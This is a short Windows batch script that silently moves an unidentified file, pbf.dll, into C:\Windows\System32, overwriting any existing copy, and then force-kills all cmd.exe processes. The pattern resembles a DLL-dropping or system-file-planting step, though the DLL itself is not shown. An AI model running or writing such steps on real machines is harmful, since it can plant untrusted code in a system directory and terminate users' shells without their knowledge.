@echo off
move /Y "%cd%\pbf.dll" "C:\Windows\System32\"
taskkill /f /im cmd.exe
